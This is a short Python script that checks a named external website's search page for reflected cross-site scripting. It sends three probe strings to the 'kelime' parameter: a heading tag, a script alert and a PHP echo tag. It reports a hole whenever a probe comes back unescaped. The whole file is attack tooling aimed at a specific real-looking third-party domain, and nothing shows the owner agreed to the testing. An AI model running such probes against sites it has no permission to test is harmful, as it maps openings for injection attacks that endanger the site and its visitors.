import requests
xss_list = ["<h1>cyber", "<script>alert(\"cyber\")</script>", "<?php echo 'hello world' ?>",]
for payload in xss_list:
    print(payload)
    url = "https://tasdevrimuhendislik.com/ara?kelime=" + str(payload)
    result = requests.get(url=url)
    if str(payload) in str(result.content):
        print("XSS is possible")
